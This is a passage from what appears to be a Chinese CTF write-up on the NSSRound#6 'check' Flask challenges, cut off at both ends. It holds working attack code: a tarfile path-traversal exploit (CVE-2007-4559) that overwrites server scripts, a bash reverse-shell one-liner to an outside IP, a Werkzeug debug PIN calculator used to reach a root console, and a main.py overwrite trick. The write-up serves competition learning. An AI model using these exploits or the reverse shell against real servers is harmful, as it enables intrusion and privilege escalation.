class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;tar&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(file.filename)</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename) <span class="keyword">and</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename <span class="keyword">and</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a tarfile&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;su ctf -c /tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这里和checkv1的话只有一处不一样</p><p><img src="../images/image-20230329192945502.png" alt="image-20230329192945502"></p><p><img src="../images/image-20230329192951184.png" alt="image-20230329192951184"></p><p>v1是用root用户来执行clean.sh</p><p>v2是用普通用户ctf来执行clean</p><p> <strong>这里的不同可能是因为出题人想的解法不同</strong></p><p>因为这里的解法用的是软链接，所以修改这里的并不影响</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28089/&quot;</span></span><br><span class="line">filename = <span class="string">r&quot;./flag.tar&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">url ,fileName</span>):</span><br><span class="line">    url = url + <span class="string">&quot;upload&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(fileName,<span class="string">&#x27;rb&#x27;</span>)&#125; <span class="comment">#这里是上传文件</span></span><br><span class="line">    response = req.post(url=url, files = file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url</span>):</span><br><span class="line">    url = url+<span class="string">&quot;download&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;flag&quot;</span>&#125; <span class="comment">#这里是post数据</span></span><br><span class="line">    response = req.post(url, data=file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload(url,filename)</span><br><span class="line">    download(url)</span><br></pre></td></tr></table></figure><h2 id="NSSRound-6-Team-check-Revenge"><a href="#NSSRound-6-Team-check-Revenge" class="headerlink" title="[NSSRound#6 Team]check(Revenge)"></a>[NSSRound#6 Team]check(Revenge)</h2><p>考点</p><p><img src="../images/image-20230329193554819.png" alt="image-20230329193554819"></p><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;tar&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename) <span class="keyword">and</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename <span class="keyword">and</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a tarfile&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> os.path.islink(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">oct</span>(os.stat(filepath).st_mode)[-<span class="number">3</span>:] != <span class="string">&#x27;444&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;su ctf -c /tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(os.environ)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230329195008532.png" alt="image-20230329195008532"></p><p>这里相较于v2，就多了这两行代码</p><p>第一个是判断文件内容是否为软链接</p><p>第二个是判断上传的文件权限是不是444</p><p><strong>预期解</strong></p><p><strong>CVE-2007-4559</strong>漏洞，可以通过tar.extractall()函数的漏洞，解压文件时候，覆盖掉目录中的文件</p><p>flask开启了debug=true模式，会有/console控制台，计算出PIN码即可进入控制台。</p><p>覆盖<code>tmp/clean.sh</code>,执行命令，拿到shell，flag的权限是root，可以通过算PIN码，提权执行命令，因为<code>main.py</code>的权限是<code>root</code></p><p>main.py就是debug控制台那，是root权限，所以就可以通过控制台来读取flag</p><p>反弹shell的原因就是为了得获取靶机中的东西来计算pin码</p><ol><li>上传tar文件，覆盖掉clean.sh，调用clean()函数调用exp.sh，进行反弹shell<br><strong>exp.sh</strong>如下：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/666 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>生成的时候得加权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp.sh</span><br></pre></td></tr></table></figure><p>x是可执行的意思</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeFileName</span>(<span class="params">filename</span>):</span><br><span class="line">    filename.name = <span class="string">&#x27;../../../../tmp/clean.sh&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    tar.add(<span class="string">&#x27;exp.sh&#x27;</span>, <span class="built_in">filter</span>=changeFileName)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://43.143.7.127:28589/upload&#x27;</span></span><br><span class="line">    response = req.post(url=url, files=&#123;<span class="string">&quot;file&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://43.143.7.127:28589/clean&#x27;</span></span><br><span class="line">    response = req.post(url)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload()</span><br><span class="line">    clean()</span><br></pre></td></tr></table></figure><p>然后先生成一下tar包</p><p>这里就是先进行tar包的上传，上传之后，就会进行解压，解压之后就会覆盖掉clean.sh,然后在访问/clean就会执行代码反弹shell了</p><p><img src="../images/image-20230329203140055.png" alt="image-20230329203140055"></p><p>这里不能在本地弹，本地弹不上去，只能在linux下弹</p><p><img src="../images/image-20230329203255973.png" alt="image-20230329203255973"></p><p>flag文件中并没有flag，flag应该在you_could_never_guess_the_flag_path中，但是只有root用户能够读取，发现main.py是root权限运行，可以计算PIN码进入console控制台获取到flag</p><p><strong>生成pin码的脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485376912775&#x27;</span>,<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&#x27;96cec10d3d9307792745ec3b85c8962099f22e5a1ea6fc770c8ef01846a5fdcb0335fa255abc4345c0bc72c44131a11f&#x27;</span><span class="comment">#  /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1./etc/machine-id    3./proc/self/cgroup  这道题是用这两个</p><p><img src="../images/image-20230329205003667.png" alt="image-20230329205003667"></p><p>最后拿到flag</p><p><strong>非预期解</strong></p><p><em>Debug模式下</em>，当<code>app.py</code>内容发生变化时，<a href="https://so.csdn.net/so/search?q=flask&amp;spm=1001.2101.3001.7020">flask</a>会重新加载</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1.14.71.254:28077/&#x27;</span></span><br><span class="line">filename = <span class="string">r&quot;main.py&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeFileName</span>(<span class="params">filename</span>):</span><br><span class="line">    filename.name=<span class="string">&#x27;../../../app/main.py&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    tar.add(filename,<span class="built_in">filter</span>=changeFileName)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">rawurl</span>):</span><br><span class="line"></span><br><span class="line">    url = rawurl + <span class="string">&quot;upload&quot;</span></span><br><span class="line">    response = req.post(url = url, files = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>(<span class="params">rawurl</span>):</span><br><span class="line">    url = rawurl + <span class="string">&#x27;download?filename=ls&#x27;</span></span><br><span class="line">    response = req.get(url)</span><br><span class="line">    <span class="built_in">print</span>(response.content)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload(url)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    getFlag(url)</span><br></pre></td></tr></table></figure><p><strong>main.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span 